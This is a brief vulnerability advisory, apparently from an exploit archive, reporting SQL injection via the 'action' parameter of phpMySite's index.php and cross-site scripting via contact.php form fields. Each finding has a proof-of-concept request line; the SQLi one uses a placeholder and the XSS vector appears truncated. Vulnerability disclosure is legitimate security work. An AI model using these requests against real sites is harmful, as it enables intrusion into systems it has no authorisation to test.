@@ -1,0 +1,31 @@
+=================================================================
+[~] phpMySite (XSS/SQLi) Multiple Remote Vulnerabilities
+=================================================================
+
+##########################################################
+## Author: Crux
+## Homepage: http://hack-tech.com
+## Date: 2-27-2010
+## Software Link: http://www.phpmysite.com/
+## Version: N/A
+##########################################################
+
+[ SQLi ]
+---------------------------------
+// This vulnerability affects index.php
+// Can be exploited VIA the GET variable 'action'
+
+[#] Exploit / POC
+index.php?action=${SQLINJECTIONHERE}&key=111-222-1933email@address.tst
+
+
+[ XSS ]
+---------------------------------
+// This vulnerability affects contact.php
+// Can be exploited via the following POST variables:
+// name, city, email, state, message
+
+[#] Exploit / POC
+name=Crux&city=1>">&state=NY&email=sample%40email%2Etst&message=111-222-1933email@address.tst&word=111-222-1933email@address.tst
+
+=================================================================
